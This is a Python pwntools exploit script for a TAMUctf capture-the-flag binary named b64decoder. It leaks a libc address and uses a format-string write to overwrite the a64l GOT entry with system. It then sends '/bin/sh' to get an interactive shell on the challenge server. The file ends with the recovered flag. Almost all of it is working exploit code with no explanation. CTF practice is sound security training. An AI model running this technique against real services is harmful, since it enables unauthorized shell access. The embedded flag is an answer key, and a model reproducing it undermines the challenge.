from pwn import *


binpath = './b64decoder'
libcpath = '/lib/i386-linux-gnu/libc.so.6'
elf = ELF(binpath)
libc = ELF('./libc.so.6')

context.terminal = ['tmux', 'split-w', '-h']


# overwrite got of a64l to system
# io = process(binpath)
io = remote('challenges.tamuctf.com', 2783)
# io = remote('localhost', 4088)
gdbscript = '''
gef
b *0x0804928B
b *0x080492F0
c
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)

io.recvuntil(b'(')
data = io.recvuntil(b')').rstrip(b')')
addr_libc = int(data, 16) - libc.symbols['a64l']
addr_system = addr_libc + libc.symbols['system']
print('addr_libc = 0x{:x}'.format(addr_libc))
print('addr_system = 0x{:x}'.format(addr_system))

print("elf.got['a64l'] = 0x{:x}".format(elf.got['a64l']))

index = 71
payload = b''
payload += p32(elf.got['a64l'])

written = 4
adjust_len = (((addr_system & 0xffff) - written - 1) % (1 << 16)) + 1
payload += b'%' + (b'%d' % adjust_len) + b'c'
payload += b'%71$hn'

print(payload)
io.sendline(payload)
# io.recvuntil(b'Please')
io.sendline(b'/bin/sh\x00')

io.interactive()

# gigem{b1n5h_1n_b45364?}
